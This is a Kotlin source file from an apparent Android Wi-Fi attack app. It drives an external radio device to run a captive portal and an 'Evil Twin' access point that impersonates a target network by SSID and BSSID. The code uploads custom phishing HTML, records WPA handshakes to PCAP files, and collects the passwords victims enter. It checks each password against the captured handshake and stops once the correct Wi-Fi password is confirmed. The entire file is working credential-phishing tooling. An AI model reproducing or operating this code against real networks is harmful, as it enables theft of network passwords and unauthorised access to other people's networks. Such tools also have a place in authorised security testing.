package com.swp81x.nrsuite

import android.net.Uri
import com.swp81x.nrsuite.core.credentials.CapturedCredential
import com.swp81x.nrsuite.core.credentials.CredentialSession
import com.swp81x.nrsuite.core.credentials.CredentialSource
import com.swp81x.nrsuite.core.credentials.CredentialStatus
import com.swp81x.nrsuite.core.eapol.EapolHandshake
import com.swp81x.nrsuite.core.eapol.EapolParser
import com.swp81x.nrsuite.core.history.HistoryLevel
import com.swp81x.nrsuite.core.log.LogLevel
import com.swp81x.nrsuite.core.pcap.PcapWriter
import com.swp81x.nrsuite.core.session.ConnectionState
import com.swp81x.nrsuite.core.session.NrSession
import com.swp81x.nrsuite.core.wpa.EvilTwinResult
import com.swp81x.nrsuite.core.wpa.WpaHandshake
import com.swp81x.nrsuite.core.wpa.WpaHandshakeParser
import com.swp81x.nrsuite.core.wpa.WpaHandshakeVerifier
import java.io.File
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject

private const val HTML_RAW_CHUNK_SIZE = 512
private const val HTML_TAIL_ALLOWANCE = 64

// Captive Portal and Evil Twin lifecycle, HTML upload, capture, and event logs.

internal fun MainViewModel.setEvilTwinHtmlFileImpl(uri: Uri, name: String?) {
    _evilTwinHtmlUri.value = uri
    _evilTwinHtmlName.value = name ?: uri.lastPathSegment ?: "evil_twin.html"
    _evilTwinHtmlUploading.value = false
    _evilTwinHtmlUploadProgress.value = 0
    _evilTwinHtmlComplete.value = false
    appendLog("Evil Twin HTML selected: ${_evilTwinHtmlName.value}")
}

internal fun MainViewModel.clearEvilTwinHtmlFileImpl() {
    _evilTwinHtmlUri.value = null
    _evilTwinHtmlName.value = null
    _evilTwinHtmlUploading.value = false
    _evilTwinHtmlUploadProgress.value = 0
    _evilTwinHtmlComplete.value = false
    appendLog("Evil Twin HTML cleared.")
}

internal fun MainViewModel.setPortalHtmlFileImpl(uri: Uri, name: String?) {
    _portalHtmlUri.value = uri
    _portalHtmlName.value = name ?: uri.lastPathSegment ?: "HTML file"
    _portalHtmlUploading.value = false
    _portalHtmlUploadProgress.value = 0
    _portalHtmlComplete.value = false
    appendLog("Portal HTML selected: ${_portalHtmlName.value}")
}

internal fun MainViewModel.clearPortalHtmlFileImpl() {
    _portalHtmlUri.value = null
    _portalHtmlName.value = null
    _portalHtmlUploading.value = false
    _portalHtmlUploadProgress.value = 0
    _portalHtmlComplete.value = false
    appendLog("Portal HTML cleared; device will use its placeholder page.")
}

internal fun MainViewModel.startPortalImpl(ssid: String, channel: Int, targetBssid: String) {
    startPortalInternalImpl(ssid, channel, targetBssid, _portalHtmlUri.value, "portal")
}

internal fun MainViewModel.startEvilTwinImpl(ssid: String, channel: Int, targetBssid: String) {
    if (_evilTwinHtmlUri.value == null) {
        appendLog("Select a custom HTML file before starting Evil Twin.", level = LogLevel.ERROR)
        return
    }
    startPortalInternalImpl(ssid, channel, targetBssid, _evilTwinHtmlUri.value, "evil_twin")
}

internal fun MainViewModel.startPortalInternalImpl(ssid: String, channel: Int, targetBssid: String, htmlUri: Uri?, mode: String) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("Connect to a device before starting the portal.")
        return
    }
    if (_portalRunning.value) return
    if (!ensureRadioIdle(if (mode == "evil_twin") "Evil Twin" else "Captive Portal")) return
    _portalMode.value = mode

    val cleanSsid = ssid.trim().ifBlank { "Free WiFi" }
    val cleanBssid = targetBssid.trim().uppercase()
    if (cleanBssid.isNotBlank() && !MainViewModel.MAC_PATTERN.matches(cleanBssid)) {
        appendLog("Invalid target BSSID: $cleanBssid")
        return
    }

    // Firmware radioIdle() stops other radio tasks when the portal starts.
    beaconStatusJob?.cancel()
    beaconStatusJob = null
    _beaconRunning.value = false
    if (_sniffing.value) {
        _sniffing.value = false
        pcapJob?.cancel()
        pcapJob = null
        scope.launch(Dispatchers.IO) {
            runCatching { pcapWriter?.close() }
            pcapWriter = null
        }
    }

    _portalSsid.value = cleanSsid
    _portalChannel.value = channel.coerceIn(1, 13)
    _portalViews.value = 0
    _portalClients.value = 0
    _portalCapturedData.value = 0
    _portalCredentials.value = emptyList()

    scope.launch {
        val args = JSONObject().apply {
            put("ssid", cleanSsid)
            put("channel", channel.coerceIn(1, 13))
            put("bssid", cleanBssid.ifBlank { "" })
        }
        appendLog("Starting captive portal '$cleanSsid' on channel ${channel.coerceIn(1, 13)}...")
        val response = activeSession.sendCommand("START_PORTAL", args, timeoutMs = 15_000)
        if (response?.optBoolean("ok") != true) {
            appendLog("Failed to start portal: ${response?.optString("msg") ?: "timeout"}")
            return@launch
        }

        _portalRunning.value = true
        updateForegroundService()
        _portalHtmlSize.value = 0
        if (mode == "evil_twin") {
            _evilTwinHtmlUploading.value = false
            _evilTwinHtmlUploadProgress.value = 0
        } else {
            _portalHtmlUploading.value = false
            _portalHtmlUploadProgress.value = 0
        }
        _portalHandshake.value = EapolHandshake()
        _portalWpaHandshake.value = WpaHandshake()

        activePortalTargetBssid = cleanBssid
        if (mode == "evil_twin") {
            _evilTwinPasswords.value = emptyList()
            _evilTwinResults.value = emptyList()
            _evilTwinEventLog.value = emptyList()
        }
        synchronized(credentialLock) {
            activeCredentialSession = CredentialSession(
                id = System.currentTimeMillis().toString(),
                source = if (mode == "evil_twin") {
                    CredentialSource.EVIL_TWIN
                } else {
                    CredentialSource.PORTAL
                },
                ssid = cleanSsid,
                bssid = cleanBssid,
                channel = channel.coerceIn(1, 13),
                startedAt = timestampNow(),
                endedAt = null,
                pcapPath = null,
                credentials = emptyList(),
            )
            evilTwinAutoStopIssued = false
        }

        if (cleanBssid.isNotBlank()) {
            portalPcapJob?.cancel()
            runCatching { portalPcapWriter?.close() }
            portalPcapWriter = null
            portalPcapFile = null
            _evilTwinCapturePath.value = null

            val captureDir = File(app.filesDir, "EvilTwin")
            if (captureDir.exists() || captureDir.mkdirs()) {
                val macName = cleanBssid.replace(":", "").uppercase()
                val captureFile = File(captureDir, "${macName}_eviltwin_${System.currentTimeMillis()}.pcap")
                portalPcapWriter = runCatching { PcapWriter(captureFile) }.getOrNull()
                portalPcapFile = captureFile
                _evilTwinCapturePath.value = captureFile.absolutePath
                synchronized(credentialLock) {
                    activeCredentialSession = activeCredentialSession?.copy(
                        pcapPath = captureFile.absolutePath,
                    )
                }
                if (portalPcapWriter != null) {
                    appendLog("Evil Twin capture: ${captureFile.absolutePath}")
                } else {
                    appendLog("Could not create Evil Twin PCAP capture file.")
                }
            }

            val captureHandshake = EapolHandshake()
            val wpaHandshake = WpaHandshake()
            var handshakeWasComplete = false
            portalPcapJob = scope.launch(Dispatchers.IO) {
                try {
                    activeSession.pcap.collect { frame ->
                        runCatching {
                            portalPcapWriter?.writePacket(frame)
                            EapolParser.parse(frame, captureHandshake)
                            _portalHandshake.value = captureHandshake.copy()
                            WpaHandshakeParser.parse(frame, wpaHandshake)
                            _portalWpaHandshake.value = wpaHandshake.copyHandshake()

                            val completeNow = wpaHandshake.isComplete
                            if (completeNow != handshakeWasComplete) {
                                handshakeWasComplete = completeNow
                                verifyEvilTwinPasswordsImpl()
                            }
                        }.onFailure { error ->
                            appendLog("Evil Twin capture parse/write error: ${error.message}")
                        }
                    }
                } catch (_: Throwable) {
                    // USB unplug can end the flow abruptly; cleanup handles state.
                }
            }
        }
        htmlCompleteFlowImpl().value = false

        if (htmlUri != null) {
            val bytes = withContext(Dispatchers.IO) {
                runCatching {
                    app.contentResolver
                        .openInputStream(htmlUri)
                        ?.use { it.readBytes() }
                }.getOrNull()
            }
            if (bytes == null) {
                appendLog("Could not read the selected HTML file.")
            } else if (bytes.isEmpty()) {
                appendLog("Selected HTML file is empty; using device placeholder.")
            } else if (!uploadPortalHtmlImpl(activeSession, bytes)) {
                appendLog("Portal HTML upload failed; device may be serving its placeholder page.")
            }
        }

        startPortalStatusPollingImpl(activeSession)
        appendLog("Portal is running.")
        addHistory("portal", "Portal started: $cleanSsid", HistoryLevel.SUCCESS)
    }
}

internal fun MainViewModel.htmlUploadingFlowImpl(): MutableStateFlow<Boolean> {
    return if (_portalMode.value == "evil_twin") _evilTwinHtmlUploading else _portalHtmlUploading
}

internal fun MainViewModel.htmlUploadProgressFlowImpl(): MutableStateFlow<Int> {
    return if (_portalMode.value == "evil_twin") _evilTwinHtmlUploadProgress else _portalHtmlUploadProgress
}

internal fun MainViewModel.htmlCompleteFlowImpl(): MutableStateFlow<Boolean> {
    return if (_portalMode.value == "evil_twin") _evilTwinHtmlComplete else _portalHtmlComplete
}

internal suspend fun MainViewModel.uploadPortalHtmlImpl(session: NrSession, bytes: ByteArray): Boolean {
    val complete = htmlCompleteFlowImpl()
    complete.value = false
    val uploading = htmlUploadingFlowImpl()
    val progress = htmlUploadProgressFlowImpl()
    uploading.value = true
    progress.value = 0
    return try {
        uploadPortalHtmlInternalImpl(session, bytes)
    } finally {
        uploading.value = false
        if (complete.value) {
            progress.value = 100
        }
    }
}

internal suspend fun MainViewModel.uploadPortalHtmlInternalImpl(session: NrSession, bytes: ByteArray): Boolean {
    val maxHtmlSize = 24 * 1024
    if (bytes.size > maxHtmlSize) {
        appendLog("HTML upload rejected: ${bytes.size} bytes exceeds firmware limit of $maxHtmlSize bytes.")
        return false
    }

    val supportsOffset = (_connectionState.value as? ConnectionState.Connected)
        ?.features
        ?.contains("portal_html_offset") == true
    appendLog(
        "Uploading HTML: ${bytes.size} bytes in " +
            "${(bytes.size + HTML_RAW_CHUNK_SIZE - 1) / HTML_RAW_CHUNK_SIZE} chunk(s) " +
            "(mode=${if (supportsOffset) "offset" else "legacy-append"})."
    )

    val reset = session.sendCommand(
        "RESET_HTML",
        JSONObject().put("size", bytes.size),
        timeoutMs = 10_000,
    )
    if (reset?.optBoolean("ok") != true) {
        appendLog("Device rejected RESET_HTML (size=${bytes.size}).")
        return false
    }

    delay(250)
    var offset = 0
    var chunkIndex = 0
    while (offset < bytes.size) {
        val end = minOf(offset + HTML_RAW_CHUNK_SIZE, bytes.size)
        val chunk = bytes.copyOfRange(offset, end)
        val encoded = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
        val isLast = end == bytes.size

        var success = false
        for (attempt in 1..3) {
            val args = JSONObject().apply {
                put("data", encoded)
                put("last", isLast)
                if (supportsOffset) {
                    put("offset", offset)
                }
            }
            val response = session.sendCommand("SET_HTML_CHUNK", args, timeoutMs = 5_000)
            if (response?.optBoolean("ok") == true) {
                success = true
                break
            }
            appendLog(
                "HTML chunk $chunkIndex offset $offset attempt $attempt failed: " +
                    (response ?: "timeout")
            )
            delay(400)
        }
        if (!success) {
            appendLog("HTML upload aborted at chunk $chunkIndex (offset $offset).")
            return false
        }

        offset = end
        chunkIndex++
        _portalHtmlSize.value = offset
        htmlUploadProgressFlowImpl().value = ((offset * 100) / bytes.size).coerceIn(0, 100)
        if (isLast) appendLog("HTML final chunk sent (${bytes.size} bytes at offset $end).")
        delay(80)
    }

    delay(350)
    var status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000)
    var complete = status?.optBoolean("html_complete") == true
    if (!complete) {
        delay(500)
        status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000) ?: status
        complete = status?.optBoolean("html_complete") == true
    }

    val deviceSize = status?.optInt("html_size", 0) ?: 0
    val deviceExpected = status?.optInt("html_expected", bytes.size) ?: bytes.size
    if (!complete) {
        appendLog(
            "HTML upload did not complete on device " +
                "(device reports size=$deviceSize, expected=$deviceExpected)."
        )
        return false
    }
    if (deviceSize < bytes.size) {
        appendLog("HTML size mismatch: sent ${bytes.size} bytes, device reports $deviceSize.")
        return false
    }
    if (deviceSize > bytes.size + HTML_TAIL_ALLOWANCE) {
        appendLog("HTML buffer looks corrupted: sent ${bytes.size} bytes, device reports $deviceSize.")
        return false
    }

    appendLog("HTML upload complete; device reports $deviceSize bytes (expected $deviceExpected).")
    htmlCompleteFlowImpl().value = true
    return true
}

internal fun MainViewModel.clearEvilTwinPasswordsImpl() {
    _evilTwinPasswords.value = emptyList()
    _evilTwinResults.value = emptyList()
}

internal fun MainViewModel.verifyEvilTwinPasswordsImpl() {
    val handshake = _portalWpaHandshake.value
    val ssid = _portalSsid.value
    val finalStatuses = setOf(
        EvilTwinResult.Status.CORRECT,
        EvilTwinResult.Status.INCORRECT,
        EvilTwinResult.Status.INVALID_LENGTH,
    )
    val previousByPassword = _evilTwinResults.value.associateBy { it.password }

    val mapped = _evilTwinPasswords.value.map { captured ->
        val password = captured.value
        val existing = previousByPassword[password]?.status
        val status = when {
            existing in finalStatuses -> existing!!
            !handshake.isComplete -> EvilTwinResult.Status.PENDING
            password.length !in 8..63 -> EvilTwinResult.Status.INVALID_LENGTH
            WpaHandshakeVerifier.verify(handshake, ssid, password) -> EvilTwinResult.Status.CORRECT
            else -> EvilTwinResult.Status.INCORRECT
        }
        EvilTwinResult(
            password = password,
            status = status,
            timestamp = captured.capturedAt,
        )
    }

    val correctResults = mapped.filter { it.status == EvilTwinResult.Status.CORRECT }
    _evilTwinResults.value = if (correctResults.isNotEmpty()) correctResults else mapped

    val correct = correctResults.firstOrNull() ?: return
    val shouldStop = synchronized(credentialLock) {
        if (evilTwinAutoStopIssued) {
            false
        } else {
            evilTwinAutoStopIssued = true
            val credential = CapturedCredential(
                value = correct.password,
                capturedAt = correct.timestamp,
                status = CredentialStatus.CORRECT,
                source = CredentialSource.EVIL_TWIN,
            )
            val current = activeCredentialSession
            val finished = (current ?: CredentialSession(
                id = System.currentTimeMillis().toString(),
                source = CredentialSource.EVIL_TWIN,
                ssid = ssid.ifBlank { "(hidden)" },
                bssid = activePortalTargetBssid,
                channel = _portalChannel.value.takeIf { it > 0 },
                startedAt = timestampNow(),
                endedAt = null,
                pcapPath = portalPcapFile?.absolutePath,
                credentials = emptyList(),
            )).copy(
                endedAt = timestampNow(),
                pcapPath = current?.pcapPath ?: portalPcapFile?.absolutePath,
                credentials = listOf(credential),
            )
            activeCredentialSession = null
            upsertCredentialSessionLocked(finished)
            appendLog("Correct password captured; stopping Evil Twin...")
            addHistory(
                "evil_twin",
                "Correct password captured for ${ssid.ifBlank { "target" }}",
                HistoryLevel.SUCCESS,
            )
            true
        }
    }
    if (shouldStop) {
        stopPortalImpl()
    }
}

internal fun MainViewModel.clearEvilTwinEventLogImpl() {
    _evilTwinEventLog.value = emptyList()
}

internal fun MainViewModel.clearPortalEventLogImpl() {
    _portalEventLog.value = emptyList()
}

internal fun MainViewModel.portalLogImpl(message: String) {
    val timestamp = java.time.LocalTime.now()
        .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
    val line = "[$timestamp] $message"
    if (_portalMode.value == "evil_twin") {
        _evilTwinEventLog.update { (it + line).takeLast(300) }
    } else {
        _portalEventLog.update { (it + line).takeLast(300) }
    }
}

internal fun MainViewModel.stopPortalImpl() {
    finishActiveCredentialSession()
    if (!_portalRunning.value) return
    portalStatusJob?.cancel()
    portalStatusJob = null
    portalPcapJob?.cancel()
    portalPcapJob = null
    val savedCapture = portalPcapFile
    runCatching { portalPcapWriter?.close() }
    portalPcapWriter = null
    portalPcapFile = null
    exportPcapToRootIfConfigured(savedCapture)
    _portalRunning.value = false
    _portalMode.value = null
    updateForegroundService()

    val activeSession = session
    scope.launch {
        val response = runCatching {
            activeSession?.sendCommand("STOP_PORTAL", timeoutMs = 8_000)
        }.getOrNull()
        if (response?.optBoolean("ok") == true) {
            appendLog("Portal stopped.")
            savedCapture?.let { appendLog("Evil Twin capture saved: ${it.absolutePath}") }
            addHistory("portal", "Portal stopped", HistoryLevel.SUCCESS)
        } else {
            appendLog("Portal stop request sent, but the device did not confirm.")
        }
    }
}

internal fun MainViewModel.startPortalStatusPollingImpl(activeSession: NrSession) {
    portalStatusJob?.cancel()
    portalStatusJob = scope.launch {
        while (isActive && _portalRunning.value) {
            delay(3_000)
            if (_connectionState.value !is ConnectionState.Connected) break
            val response = runCatching {
                activeSession.sendCommand("PORTAL_STATUS", timeoutMs = 4_000)
            }.getOrNull() ?: continue
            if (response.optBoolean("ok")) {
                _portalRunning.value = response.optBoolean("running", _portalRunning.value)
                _portalHtmlSize.value = response.optInt("html_size", _portalHtmlSize.value)
                htmlCompleteFlowImpl().value = response.optBoolean("html_complete", htmlCompleteFlowImpl().value)
            }
        }
    }
}

internal fun MainViewModel.stopLocalPortalImpl(sendStop: Boolean = true) {
    portalStatusJob?.cancel()
    portalStatusJob = null
    if (!_portalRunning.value) return
    _portalRunning.value = false
    if (sendStop) {
        val current = session
        if (current != null) {
            scope.launch {
                runCatching { current.sendCommand("STOP_PORTAL", timeoutMs = 4_000) }
            }
        }
    }
}
